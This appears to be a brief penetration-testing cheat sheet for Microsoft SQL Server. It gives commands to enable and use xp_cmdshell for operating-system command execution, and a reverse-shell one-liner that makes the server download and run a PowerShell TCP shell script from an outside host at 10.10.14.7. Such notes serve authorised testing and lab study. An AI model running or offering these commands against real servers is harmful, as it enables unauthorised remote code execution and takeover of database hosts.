# MSSQL

## XP Command Shell

- execute command
```
xp_cmdshell 'whoami'
```

- enable xp_cmdshell
```
EXEC SP_CONFIGURE 'xp_cmdshell',1
reconfigure
```

- install xp_cmdshell
```
EXEC SP_CONFIGURE 'show advanced options',1
reconfigure
```

- revshell (limit of 128 chars)
```
xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/Invoke-PowerShellTcp.ps1')"
```
